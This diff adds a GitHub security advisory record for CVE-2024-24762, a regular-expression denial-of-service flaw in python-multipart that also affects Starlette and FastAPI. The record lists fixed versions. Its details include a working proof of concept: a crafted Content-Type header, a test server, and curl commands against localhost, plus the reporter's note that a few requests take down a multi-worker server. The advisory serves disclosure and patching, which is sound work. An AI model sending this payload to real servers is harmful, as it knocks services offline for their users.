@@ -1,0 +1,140 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-2jv5-9r88-3w3p",
+  "modified": "2024-02-16T23:41:48Z",
+  "published": "2024-02-12T17:28:12Z",
+  "aliases": [
+    "CVE-2024-24762"
+  ],
+  "summary": "python-multipart vulnerable to Content-Type Header ReDoS",
+  "details": "### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n```\n\n### Impact\n\nIt's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "python-multipart"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.7"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.0.6"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "fastapi"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.109.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.109.0"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "starlette"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.36.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.36.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-24762"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Kludex/python-multipart"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tiangolo/fastapi/releases/tag/0.109.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-02-12T17:28:12Z",
+    "nvd_published_at": null
+  }
+}
